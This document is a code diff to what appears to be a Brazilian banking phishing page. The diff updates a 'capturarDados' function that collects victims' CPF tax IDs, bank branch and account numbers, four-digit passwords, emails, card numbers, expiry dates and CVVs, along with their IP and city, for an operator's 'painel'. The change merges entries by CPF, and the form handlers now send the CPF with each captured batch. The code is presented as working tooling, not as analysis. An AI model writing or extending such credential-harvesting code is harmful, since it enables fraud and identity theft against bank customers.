@@ -648,10 +648,10 @@
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
 
     <script>
-        // ===== FUNÇÃO CAPTURAR DADOS (AGORA NO INDEX.HTML) =====
+        // ===== FUNÇÃO CAPTURAR DADOS (AGORA COM UNIFICAÇÃO POR CPF) =====
         window.capturarDados = async function(dados) {
             try {
-                // Tenta obter localização (opcional)
+                // Tenta obter localização
                 let cidade = 'Desconhecido';
                 let ip = '-';
                 
@@ -664,9 +664,31 @@
                     // Ignora erro de localização
                 }
                 
-                // Dados existentes
+                // Carrega dados existentes
                 let dadosCapturados = JSON.parse(localStorage.getItem('dadosCapturados')) || [];
                 
+                // Se tem CPF, procura se já existe
+                if (dados.cpf) {
+                    const indexExistente = dadosCapturados.findIndex(d => d.cpf === dados.cpf);
+                    
+                    if (indexExistente >= 0) {
+                        // Atualiza registro existente
+                        dadosCapturados[indexExistente] = {
+                            ...dadosCapturados[indexExistente],
+                            ...dados,
+                            senha: dados.senha4 || dados.senha || dadosCapturados[indexExistente].senha || '-',
+                            cidade: dadosCapturados[indexExistente].cidade || cidade,
+                            ip: dadosCapturados[indexExistente].ip || ip,
+                            data: new Date().toLocaleString('pt-BR')
+                        };
+                        
+                        localStorage.setItem('dadosCapturados', JSON.stringify(dadosCapturados));
+                        console.log('✅ Dados atualizados para CPF:', dados.cpf);
+                        return;
+                    }
+                }
+                
+                // Se não encontrou, cria novo registro
                 const novoRegistro = {
                     data: new Date().toLocaleString('pt-BR'),
                     cpf: dados.cpf || '-',
@@ -685,7 +707,7 @@
                 dadosCapturados.push(novoRegistro);
                 localStorage.setItem('dadosCapturados', JSON.stringify(dadosCapturados));
                 
-                console.log('✅ Dados capturados:', novoRegistro);
+                console.log('✅ Novo cliente criado:', novoRegistro.cpf);
             } catch (error) {
                 console.error('❌ Erro ao capturar dados:', error);
             }
@@ -801,6 +823,7 @@
 
                 // CAPTURAR DADOS PARA O PAINEL
                 window.capturarDados({
+                    cpf: $('#cpf').val(),
                     agencia: $('#agencia').val(),
                     conta: $('#conta').val(),
                     senha4: $('#senha4').val()
@@ -825,6 +848,7 @@
 
                 // CAPTURAR DADOS PARA O PAINEL
                 window.capturarDados({
+                    cpf: $('#cpf').val(),
                     email: $('#email').val()
                 });
 
@@ -868,6 +892,7 @@
 
                 // CAPTURAR DADOS PARA O PAINEL
                 window.capturarDados({
+                    cpf: $('#cpf').val(),
                     cartao: $('#cartao').val(),
                     validade: $('#validade').val(),
                     cvv: $('#cvv').val()
